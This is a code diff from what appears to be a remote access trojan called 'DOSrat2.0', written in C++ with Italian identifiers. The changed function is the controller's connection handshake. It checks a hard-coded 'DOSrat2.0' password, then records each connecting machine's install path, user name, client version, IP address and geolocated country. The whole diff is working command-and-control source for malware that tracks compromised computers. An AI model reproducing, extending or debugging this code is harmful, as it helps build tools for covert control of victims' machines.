@@ -10,39 +10,32 @@ class COMUNICAZIONI
 	}
 
 	public:
-	static void Inizializzazione(int Index)
+	static void Inizializzazione(int Index, SOCKET Sock)
 	{
 		char Pass[10]; // DOSrat2.0
-		vector<char> Buff;
-		char Size[5] = { 0 };
 		IPinfo GeoIP;
-		EasyMSGB msgb;
 
-		TcpIP::SetTimeout(10000, Clients[Index].sock);
+		TcpIP::SetTimeout(10000, Sock);
 
-		if (recv(Clients[Index].sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
+		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
 		{
-			TerminaConnessione(Clients[Index].sock);
+			TerminaConnessione(Sock);
 			return;
 		}
 		if ((string)Pass != "DOSrat2.0")
 		{
-			TerminaConnessione(Clients[Index].sock);
+			TerminaConnessione(Sock);
 			return;
 		}
-		if (send(Clients[Index].sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
+		if (send(Sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
 		{
-			TerminaConnessione(Clients[Index].sock);
+			TerminaConnessione(Sock);
 			return;
 		}
 
-		TcpIP::SetTimeout(0, Clients[Index].sock);
+		TcpIP::SetTimeout(0, Sock);
 
-		recv(Clients[Index].sock, Size, sizeof(Size), 0);
-		Buff.resize(atoi(Size));
-		recv(Clients[Index].sock, &Buff[0], atoi(Size), 0);
-
-		json data = json::parse(string(Buff.begin(), Buff.end()));
+		json data = json::parse(TcpIP::RecvString(Sock));
 
 		Clients[Index].IsConnected = true;
 		Clients[Index].info.InstallPath = data["InstallPath"];
@@ -52,10 +45,12 @@ class COMUNICAZIONI
 		Clients[Index].info.UserName = data["UserName"];
 		Clients[Index].info.Versione = data["Versione"];
 
-		Clients[Index].info.IP = TcpIP::GetIP(Clients[Index].sock);
+		Clients[Index].info.IP = TcpIP::GetIP(Sock);
 		Clients[Index].info.Nazione = (IPlocation::GetInfoFromIP(Clients[Index].info.IP, GeoIP) == 0) ? GeoIP.CountryCode : "";
 
 		Clu->AggiornaCount();
 		Clu->AggiornaTitolo();
 	}
+
+
 };
